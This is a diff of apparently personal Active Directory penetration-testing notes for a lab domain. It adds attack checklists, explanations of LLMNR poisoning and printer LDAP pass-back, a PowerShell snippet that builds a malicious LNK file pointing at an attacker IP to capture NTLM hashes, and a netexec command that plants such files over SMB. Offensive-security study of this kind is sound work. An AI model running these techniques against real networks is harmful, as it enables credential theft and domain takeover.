@@ -2,14 +2,13 @@ HYDRA-DC 10.0.2.250
 punisher 10.0.2.220
 spiderman 10.0.2.221
 
-## Strategy
-- Responder
-- MiTM6
-- Scan to generate traffic
-- Look for default cred
-- What else can I do?
+# INTERNAL ATTACKS
+1. Start with mitm6 and responder
+2. Scan to generate traffic
+3. Check websites and look for alternate paths
+4. Look for default creds / low hanging fruit
+5. What else can I do?
 
-# INIT ACCESS
 ## LLMNR POISON
 *This attack works because a machine in an AD environment requests access to a named service that doesn't exist. The connection fails, and the attacker requests the user:hash to connect the target to the nonexistent service. The target sends the user:hash and attacker can use them for a hashcrack.
 
@@ -179,7 +178,19 @@ Also try checking [this](https://www.mindpointgroup.com/blog/how-to-hack-through
 "**Introducing the Pass-Back Attack**
 The stored LDAP credentials are usually located on the network settings tab in the online configuration of the MFP and can typically be accessed via the Embedded Web Service (EWS). If you can reach the EWS and modify the LDAP server field by replacing the legitimate LDAP server with your malicious LDAP server, then the next time an LDAP query is conducted from the MFP, it will attempt to authenticate to your LDAP server using the configured credentials or the user-supplied credentials."
 
-# POST-COMPROMISE 
+# POST-MACHINE COMPROMISE 
+1. Try for easy wins
+	1. Kerberoasting
+	2. Secretsdump
+	3. Pass the X
+2. Dig Deeper!
+	1. Enumeration 
+		1. Bloodhound 
+		2. Plumhound
+		3. PingCastle
+		4. ldapdomaindump
+	2. What can I access with this account
+	3. Any old vulns?
 
 ## LDAP Domain Dump
 *As previously seen in MiTM6*
@@ -331,15 +342,42 @@ meterpreter >
 ## LNK File Attack
 *Create a watering hole file to link back to your server to trigger Responder*
 
+In PowerShell (on any machine) run this to create the file.
+```
+$objShell = New-Object -ComObject WScript.shell 
+$lnk = $objShell.CreateShortcut("C:\test.lnk") 
+$lnk.TargetPath = "\\<attack-ip>\@test.png" 
+$lnk.WindowStyle = 1 
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
+$lnk.Description = "Test" 
+$lnk.HotKey = "Ctrl+Alt+T" 
+$lnk.Save()`
+```
+To automate this run
+```
+netexec smb <Target IP> -d <Domain> -u <User> -p <Password> -M slinky -o NAME=test SERVER=<Domain IP>
+```
+For more info check [here](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)
 
 ## GPP/ cPassword Attacks
+*Old, but who knows, it may just work out*
+Patched in MS14-025
+This will sometimes find user:pass pairs stored on old GPP
+
+In Metasploit use smb_enum_gpp
 
 ## Mimikatz
 
+# POST-DOMAIN COMPROMISE 
 ## NTDS.dit
+*This is a AD database for user, group & password hashes*
+
 
 ## Golden Ticket
 
+### ZeroLogon
+
+### PrintNightmare
 
 
 
